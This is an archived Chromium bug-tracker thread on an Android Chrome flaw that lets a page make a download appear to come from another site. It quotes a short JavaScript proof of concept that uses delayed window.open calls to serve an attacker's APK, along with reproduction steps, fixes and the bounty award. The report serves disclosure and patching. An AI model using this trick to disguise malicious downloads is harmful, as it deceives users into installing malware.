# (Chrome & Chromium Browsers) File Download Pop-up Origin Spoof

| Field | Value |
|-------|-------|
| **Issue ID** | [40055527](https://issues.chromium.org/issues/40055527) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | UI>Browser>Downloads |
| **Platforms** | Android |
| **Reporter** | sh...@gmail.com |
| **Assignee** | xi...@chromium.org |
| **Created** | 2021-04-12 |
| **Bounty** | $7,500.00 |

## Description

Steps to reproduce the problem:
1. Open Chrome For Android & visit http://sha3.ezyro.com/dspoof.html
2. You will notice a Download Button, click on it.
3. By clicking on the download button it will take you to the different host and the download file pop-up will appear after few seconds (time can be increased or decreased).
4. The file which appears in download pop-up is attacker's file.
5. Now go inside Download section of browser.
6. You will notice the downloaded file shows different origin inplace of attackers origin.

What is the expected behavior?
The browser should show the exact domain from which the file download was requested.

What went wrong?
The file download requested from different origin gets displayed on another different origin inside Download section of Browser.

Did this work before? N/A 

Chrome version: 89.0.4389.105  Channel: n/a
OS Version: 
Flash Version: 

This issue can be reproduced on all Android Chromium based Browsers which includes: Chrome, Yandex, Edge, Brave, etc.

## Attachments

- [dspoof.html](attachments/dspoof.html) (text/plain, 600 B)
- [poc.mp4](attachments/poc.mp4) (video/mp4, 6.0 MB)
- [Screenshot from 2021-07-29 11-08-30.png](attachments/Screenshot from 2021-07-29 11-08-30.png) (image/png, 31.1 KB)

## Timeline

### [Deleted User] (2021-04-12)

[Empty comment from Monorail migration]

### ct...@chromium.org (2021-04-13)

Thanks for the report. Passing this over to Downloads OWNERS -- xingliu@ could you PTAL?

The relevant bit of dspoof.html is this:

  <script>
function a(){
	window.open('https://anylegitsite.com', 'x');
	setTimeout(function(){
		window.open('https://attackersite.com/POC.apk', 'x');
	}, 5000);
}
</script>

So the attacker controlled site triggers a new tab to open, and then the delayed task triggers on top of it. This would maybe be less-than-ideal on its own, but that it causes the Download UI to attribute the download to the wrong tab is the main issue. Setting Sev-Medium (partial control over origin display/control in a specific context only) and Impact-Stable.

[Monorail components: UI>Browser>Downloads]

### [Deleted User] (2021-04-13)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ct...@chromium.org (2021-04-14)

Was reminded of https://crbug.com/chromium/1157743 (but simpler) -- this might be a duplicate? Reporter: Does this still repro for you on Chrome Canary?

### xi...@chromium.org (2021-04-14)

[Empty comment from Monorail migration]

### xi...@chromium.org (2021-04-14)

We are displaying tab url in the download home UI.

https://source.chromium.org/chromium/chromium/src/+/master:chrome/browser/download/offline_item_utils.cc;l=125;drc=66e04949d11dd5d3013cf8c0f88c3e4af66fcea9;bpv=1;bpt=1

The offline_item.page_url is used in UiUtils.java in to generate the subtitle showing in the UI.
https://source.chromium.org/chromium/chromium/src/+/master:chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/UiUtils.java;l=120?q=uiutils%20download&ss=chromium%2Fchromium%2Fsrc

If this is the problem, we may change to use the final destination URL. This is purely UI and plumbing issue between UI and c++ backend.

### xi...@chromium.org (2021-04-14)

We plumb the the first URL in the url redirection chain as OriginalUrl, this can be used as well.

### xi...@chromium.org (2021-04-15)

On desktop, we actually use DownloadItem::GetURL(),  which is the last element in the url chain. This sounds more reasonable than the first element in the URL chain as OfflineItem.original_url. I'm not sure why we don't do it in the first place for android code....

https://source.chromium.org/chromium/chromium/src/+/master:chrome/browser/ui/webui/downloads/downloads_list_tracker.cc;l=261;drc=66e04949d11dd5d3013cf8c0f88c3e4af66fcea9;bpv=1;bpt=1

### qi...@chromium.org (2021-04-15)

desktop is showing the full url, mobile only shows the origin

My previous CL only fixed the PrefetchCaption: https://chromium-review.googlesource.com/c/chromium/src/+/2616958, missed the genericCaption

### xi...@chromium.org (2021-04-15)

Prefetch use case is probably different.  It's better for it to use the first URL. Should download use the first or the last?

### sh...@gmail.com (2021-04-15)

Does this still repro for you on Chrome Canary?
- Yes I can reproduce the issue on Chrome Canary for Android, tested on version: 92.0.4477.0

### qi...@chromium.org (2021-04-15)

I think first is fine, as this is where the download happens

### gi...@appspot.gserviceaccount.com (2021-04-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/1a7eaa11ca70b85089212e50ab8d8f5f14ebf3c3

commit 1a7eaa11ca70b85089212e50ab8d8f5f14ebf3c3
Author: Xing Liu <xingliu@chromium.org>
Date: Thu Apr 15 20:04:38 2021

Download: Show a proper URL in download home UI.

Don't show the tab URL in download home UI.

Bug: 1198165
Change-Id: I169bc9fd656c879a47ff1e290554df19cb4790d8
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2827403
Reviewed-by: Min Qin <qinmin@chromium.org>
Commit-Queue: Xing Liu <xingliu@chromium.org>
Cr-Commit-Position: refs/heads/master@{#873011}

[modify] https://crrev.com/1a7eaa11ca70b85089212e50ab8d8f5f14ebf3c3/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/UiUtils.java


### xi...@chromium.org (2021-04-16)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-17)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-17)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-17)

Requesting merge to beta M90 because latest trunk commit (873011) appears to be after beta branch point (857950).

Requesting merge to future beta M91 because latest trunk commit (873011) appears to be after future beta branch point (870763).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-04-17)

This bug requires manual review: Request affecting a post-stable build
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), bindusuvarna@(iOS), cindyb@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-04-18)

Your change meets the bar and is auto-approved for M91. Please go ahead and merge the CL to branch 4472 (refs/branch-heads/4472) manually. Please contact milestone owner if you have questions.
Merge instructions: https://www.chromium.org/developers/how-tos/drover
Owners: benmason@(Android), bindusuvarna@(iOS), kbleicher@(ChromeOS), pbommana@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2021-04-19)

+adetaylor@ (Security TPM) for M90 merge review. Thank you.

### xi...@chromium.org (2021-04-20)

Hi, adetaylor@, please help take a look at the merge request to M90 and feel free to assess the severity of this bug, thanks!

### ad...@google.com (2021-04-20)

Approving merge to M90, branch 4430: this is a very low risk change.

### xi...@chromium.org (2021-04-20)

Thanks!

### gi...@appspot.gserviceaccount.com (2021-04-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/9276c4d930fa5c30dc1750c148ab71e8f3fbf543

commit 9276c4d930fa5c30dc1750c148ab71e8f3fbf543
Author: Xing Liu <xingliu@chromium.org>
Date: Tue Apr 20 19:45:16 2021

Download: Show a proper URL in download home UI.

Don't show the tab URL in download home UI.

(cherry picked from commit 1a7eaa11ca70b85089212e50ab8d8f5f14ebf3c3)

Bug: 1198165
Change-Id: I169bc9fd656c879a47ff1e290554df19cb4790d8
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2827403
Reviewed-by: Min Qin <qinmin@chromium.org>
Commit-Queue: Xing Liu <xingliu@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#873011}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2840405
Cr-Commit-Position: refs/branch-heads/4430@{#1314}
Cr-Branched-From: e5ce7dc4f7518237b3d9bb93cccca35d25216cbe-refs/heads/master@{#857950}

[modify] https://crrev.com/9276c4d930fa5c30dc1750c148ab71e8f3fbf543/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/UiUtils.java


### gi...@appspot.gserviceaccount.com (2021-04-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/382abb96af1200991198cecf98196efd63641dd2

commit 382abb96af1200991198cecf98196efd63641dd2
Author: Xing Liu <xingliu@chromium.org>
Date: Tue Apr 20 20:39:27 2021

Download: Show a proper URL in download home UI.

Don't show the tab URL in download home UI.

TBR=dtrainor@chromium.org

(cherry picked from commit 1a7eaa11ca70b85089212e50ab8d8f5f14ebf3c3)

Bug: 1198165
Change-Id: I169bc9fd656c879a47ff1e290554df19cb4790d8
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2827403
Reviewed-by: Min Qin <qinmin@chromium.org>
Commit-Queue: Xing Liu <xingliu@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#873011}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2836472
Cr-Commit-Position: refs/branch-heads/4472@{#264}
Cr-Branched-From: 3d60439cfb36485e76a1c5bb7f513d3721b20da1-refs/heads/master@{#870763}

[modify] https://crrev.com/382abb96af1200991198cecf98196efd63641dd2/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/UiUtils.java


### am...@chromium.org (2021-04-23)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-04-23)

[Comment Deleted]

### am...@google.com (2021-04-23)

[Empty comment from Monorail migration]

### sh...@gmail.com (2021-04-24)

hello, what name or handle would you like us to use in crediting you for this issue?
- Name: Mohit Raj (shadow2639)

Also if possible can you modify my mail username from second last comment? If incase this report goes public it will reveal my mail ID.
Thanks!

### as...@google.com (2021-04-26)

Marking as NotApplicable for LTS since Android-only issue.

### am...@chromium.org (2021-04-28)

due to impact/quality of spoof and almost full control over origin display/control, retroactively boosting severity to High to help inform future sherriffing and other security impact decisions 

### am...@google.com (2021-04-28)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-04-29)

Congratulations! The VRP Panel had decided to award you $7500 for this report. A member of our finance team will be in touch soon to arrange payment. Very nice work!! 

### sh...@gmail.com (2021-04-29)

Thank you soo much team <3

### am...@google.com (2021-04-30)

[Empty comment from Monorail migration]

### am...@google.com (2021-04-30)

[Empty comment from Monorail migration]

### [Deleted User] (2021-07-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@gmail.com (2021-07-28)

Hello team, I think the issue still exists on the latest release of Chrome for Android version : 92.0.4515.115 and also on the Chrome Canary for Android version : 94.0.4589.2
I was able to reproduce the issue on both Android 10 and Android 11 device. Would you mind checking it ?

### al...@alesandroortiz.com (2021-07-28)

Re: https://crbug.com/chromium/1198165#c38, I can also repro on Canary (same version as https://crbug.com/chromium/1198165#c38) and Beta (92.0.4515.115) but *not* Stable (same version as https://crbug.com/chromium/1198165#c38).

To make the repro reliable, you need to tap anywhere on the page before clicking the link/button, since otherwise it won't have the user activation to open the popup.

### am...@google.com (2021-07-28)

rolling visibility back to RV-ST to provide the team an opportunity to verify this can still be reproduced in noted versions 

### xi...@chromium.org (2021-07-28)

reopen as report of repro in canary, I think we have a recent change related to this to use the final url in the url chain, which is more secure.

### [Deleted User] (2021-07-29)

[Empty comment from Monorail migration]

### [Deleted User] (2021-07-29)

We commit ourselves to a 60 day deadline for fixing for high severity vulnerabilities, and have exceeded it here. If you're unable to look into this soon, could you please find another owner or remove yourself so that this gets back into the security triage queue?

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2021-07-29)

Can't reproduce on ToT in an emulator, currently we use the last URL in the URL redirection chain. Chrome version is 94.0.4590.0.

I'll try 92.0.4515.115 as well.

### xi...@chromium.org (2021-07-29)

Just found if we disable the finch experiment(a/b testing) for UseDownloadOfflineContentProvider, it will reproduce. Also it affects another security bug, we need to change the plumbing for the old download backend code path as well.  This can be disable through "chrome://flags" and disable ""Enable new download backend" in version 92. This flag is deleted and won't be shown in 94.

Btw, it would be nice to roll out UseDownloadOfflineContentProvider to 100%, so we can delete the old code path.

### gi...@appspot.gserviceaccount.com (2021-07-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/7bec935d94d00ebca571b838bf593d337aac4397

commit 7bec935d94d00ebca571b838bf593d337aac4397
Author: Xing Liu <xingliu@chromium.org>
Date: Thu Jul 29 21:58:24 2021

Download: Fix final URL plumbing for old download code path.

When UseDownloadOfflineContentProvider feature is disabled, the URL
shown on the UI is still tab URL, this CL fixed the plumbing to improve
security for the old code path.

Bug: 1198165,1213350
Change-Id: I6e8940491e3030b8c70b1058c955d0fdc8d01e3d
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3061420
Reviewed-by: Min Qin <qinmin@chromium.org>
Commit-Queue: Xing Liu <xingliu@chromium.org>
Cr-Commit-Position: refs/heads/master@{#906866}

[modify] https://crrev.com/7bec935d94d00ebca571b838bf593d337aac4397/chrome/browser/download/android/download_manager_service.cc


### xi...@chromium.org (2021-07-29)

Request to merge 7bec935d94d00ebca571b838bf593d337aac4397 in https://crbug.com/chromium/1198165#c46, this fixed an issue for two security bugs.

Not sure whether needs to merge to M92,  will depend on TPM's decision. If M92 is required, we also need to merge 7e8ce4c0761bbbfdf629a5b33bdb6de9ceab392f.

### [Deleted User] (2021-07-29)

This bug requires manual review: M93's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/main/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), govind@(iOS), geohsu@(ChromeOS), pbommana@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2021-07-30)

[Comment Deleted]

### xi...@chromium.org (2021-07-30)

Merge survey:

1. Yes.
2. 7bec935d94d00ebca571b838bf593d337aac4397  for M93.
3.  No, will verify today.
4. Could be needed for M92, then also need to merge  7e8ce4c0761bbbfdf629a5b33bdb6de9ceab392f.
5. Security bugs fixes. Found after branch point.
6. No
7. Not befind flags or using finch.

### am...@chromium.org (2021-08-02)

Hi xingliu@ looks like on Friday you were going to verify as of item #3 in the merge survey responses in https://crbug.com/chromium/1198165#c50; if you have verified and are good with fix and stability on canary, please update this issue as Fixed. I'll loop back and review this for merge to M93. Thanks! 

### xi...@chromium.org (2021-08-03)

Verified on canary, I should be in an A/B testing group that doesn't enable the UseDownloadOfflineContentProvider feature. Also the fix should be fairly safe. So please feel free to approve the merge.

### xi...@chromium.org (2021-08-04)

M93 merge is still needed I think.

### am...@chromium.org (2021-08-04)

Merge review hasn't kicked in because this bug is still marked as open. As soon as it's updated to Fixed, the merge review labeling will kick in from the bot, which would raise this to our attention to (re-)review. Thanks! 

### am...@chromium.org (2021-08-04)

but in the meantime, since all of our discussion above, please go ahead and merge to M93, branch 4577. 

### xi...@chromium.org (2021-08-04)

Oh, good to know, let me mark fixed and start to merge. 

### gi...@appspot.gserviceaccount.com (2021-08-04)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/86a9684977f0e5869d3b7a9f8f48f17c893ff52f

commit 86a9684977f0e5869d3b7a9f8f48f17c893ff52f
Author: Xing Liu <xingliu@chromium.org>
Date: Wed Aug 04 21:05:00 2021

Download: Fix final URL plumbing for old download code path.

When UseDownloadOfflineContentProvider feature is disabled, the URL
shown on the UI is still tab URL, this CL fixed the plumbing to improve
security for the old code path.

(cherry picked from commit 7bec935d94d00ebca571b838bf593d337aac4397)

Bug: 1198165,1213350
Change-Id: I6e8940491e3030b8c70b1058c955d0fdc8d01e3d
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3061420
Reviewed-by: Min Qin <qinmin@chromium.org>
Commit-Queue: Xing Liu <xingliu@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#906866}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3072318
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/4577@{#448}
Cr-Branched-From: 761ddde228655e313424edec06497d0c56b0f3c4-refs/heads/master@{#902210}

[modify] https://crrev.com/86a9684977f0e5869d3b7a9f8f48f17c893ff52f/chrome/browser/download/android/download_manager_service.cc


### [Deleted User] (2021-11-12)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1198165?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055527)*
